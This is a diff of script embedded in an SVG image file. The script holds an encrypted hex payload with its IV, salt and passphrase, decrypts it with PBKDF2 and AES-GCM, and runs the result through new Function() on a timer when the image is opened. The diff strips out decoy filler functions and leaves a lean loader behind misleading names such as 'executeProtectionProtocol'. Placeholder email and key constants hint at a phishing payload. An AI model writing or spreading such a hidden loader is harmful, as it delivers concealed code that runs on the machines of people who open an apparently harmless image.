@@ -9,151 +9,43 @@
       memoryAllocated: 0,
       cpuCycles: 0
     };
-    
+     const bel = "[EMAIL]";
+    const lieve = "[KEY]";
     function collectPerformanceData() {
       performanceMetrics.memoryAllocated = window.performance?.memory?.usedJSHeapSize || 0;
       performanceMetrics.endTime = Date.now();
       performanceMetrics.cpuCycles = Math.random() * 1500;
     }
-    
-    function showDebugMessages() {
-      if (Math.random() > 0.85) {
-        
-      }
-    }
 
-    // constants
- const bel = "[EMAIL]";
-    const lieve = "[KEY]";
-    const MATH_CONST = Math.PI * 3;
-    const DUMMY_LIST = [9, 8, 7, 6, 5];
-    
     // ============== SECURITY LAYER ==============
     const protectionSettings = (function() {
       const sensitiveData = {
-        cryptoIV: "944b1aba170d146338b20887",
-        encryptionSalt: "c20e1712aa116969f10f78af546515d6",
-        protectedContent: "de871d07314294d83dd369c2e8b63bb34e2df4f7803e8fe0eb394f32192e2ee824b749a95f21ed39e09b9ace9b5ec9a94667cb3bb86048dda48655cce1285922e0d6badab7f64986efe6709f6a4ddb4eeac1ba8abe03125938fc186694d33435dbd4c0544aec6cea89a857bd1d06f271e61aeb237e5c62af6fcad18e5465aaa549e9d1cdf7e82295a25a5c03c61304162b81f03703844af2182dffbb0076461a9147cccb61bc20fe450facb34229ccce119db0805d30503953039cb8dbc76d42deb929471816ebe56f522fc925bc782be15bc7edd5cac5bfdc0eee966952f4f91d6f18ef5dc09d00816baf828dd4e2b21408b9f694712ff5ad674f2f14bbbd001af225a6c8a53777aa0d7a6c8a60602cc945edb2f7e47edca97b7aea7443ff474d37f0f441fd40612d202e7c3138d3a9b36282b0a580bea3e4d3c92fbd3c6359ab612c54a30dc0499d7720d64a16f9960da5efa97a82993139c9a1a879e19f0406e9141f27457c147f8638c20580558b00ae14f6353d2e91e50dcce9336e360450081c28463586d13fc11a4652d26053e68cc4531412adec9040ed925dc64332ba7c3fc45f5cca457dd14464fabfa2a3af668c4f545ec2fa42917b62ea6f27166b1b43d04cd6a84d257d6caf9860174d9c8050a2364211b41c49fb497ba6e3a248e26be85df354bd0c5e7b69ee14e7",
-        authToken: "M"
+        cryptoIV: "0d0b798446d57328bdeb640d",
+        encryptionSalt: "58525225b2f0aecba54c92e7fe44b669",
+        protectedContent: "c6c8ecc11ec8480edfe542528b7115041d348bf0960305a48f0601424089b1c929a1b7c3f0b25a3a7c61623bb653ce56a0f3e0594d343918d291fde0da4ac9067cc4f3cb0daf1ebb4c4915f2672c4bef23c398d4ffa3e75c23ee49eee2030473104ecc96d94c813347704a04865ba6936f1d0fc09c7cd4fe593408da6054ba30c8e7c82b0d0d0f2c75360bd20f6a403e99c2f9276fb2ddcb0ce02ded7e7ff48260a1acd2892756f673fc50ceb949e045ee0cfc1be7a786b82926cac0ef22440e01efd686bafeb58748ae0af74d405cc43a11bf7135b3a44e378601dffd10d6cd24938aed898fecfc101528a1d1b21431aae04d3d4b3374261d72936ca06ea4697198910668bb3484072bb795ef63b84489b7116069d63d873b370c1693780c1aaeec1fce4b1523336d0a6ac22ebc7433f4c823b4fb63045a7ade158aae7a67402107c59386056867b5003e232f2af6fa40678a81c6959146b79c09fe70e35e27614f152744b2d9f20b7f27785cee1ddc170c48a5195f4fa6be4d0d8f7dfe4e4454dfb33ed7e45d657e9e629b2850ee9edd9f8bb50c978ae14e4c337785f6fd25f72bec519b782f7c408c4183cdc6107e457846f52677339b56d215aeb3e674e4473de38a870e5087f18da1821e94e52348d3185a3269095f1e082ccccbc45bdd2d21c4df9e40898da9eb3f7542dc2d",
+        authToken: "drop"
       };
-      
-      function checkDataFormat(input) {
-        return input && typeof input === 'string' && input.length > 0;
-      }
-      
-      function verifyHexString(data) {
-        try {
-          return /^[a-f0-9]+$/i.test(data);
-        } catch (error) {
-          return false;
-        }
-      }
 
-      // Useless string generator
-      function makeRandomString() {
-        return Math.random().toString(36).substring(2, 15) + "-" + Date.now().toString(36).slice(-6);
-      }
-      
-      // Useless math function
-      function calcCircleArea(radius) {
-        return Math.PI * Math.pow(radius, 2);
-      }
-      
       return {
         getIV: function() {
-          if (!verifyHexString(sensitiveData.cryptoIV)) {
-            
-            return '';
-          }
           return sensitiveData.cryptoIV;
         },
         getSalt: function() {
-          if (!verifyHexString(sensitiveData.encryptionSalt)) {
-            
-            return '';
-          }
           return sensitiveData.encryptionSalt;
         },
         getEncryptedData: function() {
-          if (!verifyHexString(sensitiveData.protectedContent)) {
-            
-            return '';
-          }
           return sensitiveData.protectedContent;
         },
         getToken: function() {
           return sensitiveData.authToken;
-        },
-        // Useless utility
-        generateDummyCode: function() {
-          return makeRandomString();
         }
       };
     })();
-    
-    // ============== HELPER FUNCTIONS ==============
-    function convertHexToBytes(hexString) {
-      try {
-        if (!hexString || hexString.length % 2 !== 0) {
-          
-          return new Uint8Array();
-        }
-        
-        const byteArray = new Uint8Array(hexString.length / 2);
-        for (let i = 0; i < hexString.length; i += 2) {
-          const byteValue = parseInt(hexString.substr(i, 2), 16);
-          if (isNaN(byteValue)) {
-            
-            return new Uint8Array();
-          }
-          byteArray[i/2] = byteValue;
-        }
-        return byteArray;
-      } catch (e) {
-        
-        return new Uint8Array();
-      }
-    }
-    
-    // Useless ID maker
-    function createSessionId() {
-      const timePart = Date.now().toString(36).slice(-4);
-      const randomPart = Math.random().toString(36).substring(2, 6);
-      return "ok";
-    }
-    
-    // Useless calculation
-    function performRandomMath() {
-      return Math.pow(Math.random() * 10, 2) + Math.E;
-    }
-    
-    // Useless DOM manipulation
-    function addDebugNodes() {
-      const tags = ['section', 'article', 'footer', 'header'];
-      tags.forEach(tag => {
-        const el = document.createElement(tag);
-        el.className = 'temp-node-' + Math.random().toString(36).substring(2, 4);
-        el.setAttribute('data-test', 'true');
-        document.body.appendChild(el);
-      });
-    }
-    
-    // ============== CORE FUNCTIONALITY ==============
+
     async function executeProtectionProtocol() {
-      
       collectPerformanceData();
-      
       try {
-        // Check crypto support
-        if (!window.crypto || !window.crypto.subtle) {
-          throw new Error("Crypto API not available");
-        }
-        
-        // Step 1: Prepare crypto components
-        
         const token = protectionSettings.getToken();
-        if (!token) throw new Error("Invalid auth token");
-        
         const keyMaterial = await window.crypto.subtle.importKey(
           "raw",
           new TextEncoder().encode(token),
@@ -161,12 +53,8 @@
           false,
           ["deriveKey"]
         );
-        
-        // Step 2: Derive crypto key
-        
+
         const salt = protectionSettings.getSalt();
-        if (!salt) throw new Error("Invalid salt value");
-        
         const cryptoKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
@@ -179,13 +67,10 @@
           false,
           ["decrypt"]
         );
-        
-        // Step 3: Decrypt content
-        
+
         const iv = protectionSettings.getIV();
         const encryptedData = protectionSettings.getEncryptedData();
-        if (!iv || !encryptedData) throw new Error("Invalid crypto parameters");
-        
+
         const decryptedData = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
@@ -194,144 +79,22 @@
           cryptoKey,
           convertHexToBytes(encryptedData)
         );
-        
-        // Step 4: Execute content
+
         const codeToExecute = new TextDecoder().decode(decryptedData);
-        if (codeToExecute && codeToExecute.trim().length > 0) {
-          
-          try {
-            (new Function(codeToExecute))();
-          } catch (execError) {
-            
-          }
-        } else {
-          
-        }
-        
-      } catch (mainError) {
-        
-      } finally {
-        showDebugMessages();
+        (new Function(codeToExecute))();
+      } catch (error) {
+        console.error("Decryption error:", error);
       }
     }
-    
-    // Useless event listener
-    document.addEventListener('load', function() {
-      console.log('Page loaded - additional event');
-    });
-    
-    // Randomized execution scheduler
-    function planExecution() {
-      const minDelay = 200;
-      const extraDelay = Math.floor(Math.random() * 300);
-      const finalDelay = minDelay + extraDelay;
-      
-      if (window.requestIdleCallback) {
-        window.requestIdleCallback(executeProtectionProtocol, { timeout: 800 });
-      } else {
-        setTimeout(executeProtectionProtocol, finalDelay);
+
+    function convertHexToBytes(hexString) {
+      const byteArray = new Uint8Array(hexString.length / 2);
+      for (let i = 0; i < hexString.length; i += 2) {
+        byteArray[i / 2] = parseInt(hexString.substr(i, 2), 16);
       }
+      return byteArray;
     }
-    
-    // Useless init
-    function startSystem() {
-      console.log('Booting system components...');
-      planExecution();
-      addDebugNodes();
-    }
-    
-    // Delayed init
-    setTimeout(function() {
-      console.log('Initializing subsystems...');
-      startSystem();
-    }, 200);
-    
-    // Useless periodic check
-    setInterval(function() {
-      if (Math.random() > 0.9) {
-        console.log('System diagnostics running');
-      }
-    }, 25000);
-    
-    // Additional useless function
-    function createTestData() {
-      const testObjects = [];
-      for (let j = 0; j < 5; j++) {
-        testObjects.push({
-          id: 'item-' + j,
-          value: Math.random() * 50,
-          timestamp: new Date().toISOString()
-        });
-      }
-      return testObjects;
-    }
-    
-    // Useless class
-    class DummyComponent {
-      constructor() {
-        this.version = '3.1.4';
-        this.enabled = false;
-      }
-      
-      enable() {
-        this.enabled = true;
-        
-      }
-    }
-    
-    // More useless variables
-    const SYSTEM_SETTINGS = {
-      debugEnabled: false,
-      testingMode: true,
-      compatibilityMode: Math.random() > 0.6
-    };
-    
-    // Useless async function
-    function mockNetworkCall() {
-      return new Promise((resolve) => {
-        setTimeout(() => {
-          resolve({ state: 'done', result: 204 });
-        }, Math.random() * 1500);
-      });
-    }
-    
-    // New useless functions added below
-    function calculateFibonacci(n) {
-      if (n <= 1) return n;
-      return calculateFibonacci(n - 1) + calculateFibonacci(n - 2);
-    }
-    
-    function generateColorPalette() {
-      const colors = [];
-      for (let i = 0; i < 5; i++) {
-        colors.push(`#${Math.floor(Math.random()*16777215).toString(16)}`);
-      }
-      return colors;
-    }
-    
-    function createDummyEvent() {
-      const events = ['click', 'hover', 'focus', 'blur'];
-      const randomEvent = events[Math.floor(Math.random() * events.length)];
-      document.dispatchEvent(new Event(randomEvent));
-    }
-    
-    function monitorPerformance() {
-      const start = performance.now();
-      let count = 0;
-      while (performance.now() - start < 5) {
-        count++;
-      }
-      return count;
-    }
-    
-    function shuffleArray(arr) {
-      return arr.sort(() => Math.random() - 0.5);
-    }
-    
-    function createDummyPromise() {
-      return new Promise(resolve => {
-        setTimeout(() => resolve('dummy'), 100);
-      });
-    }
+
+    setTimeout(executeProtectionProtocol, 300);
   ]]></script>
 </svg>
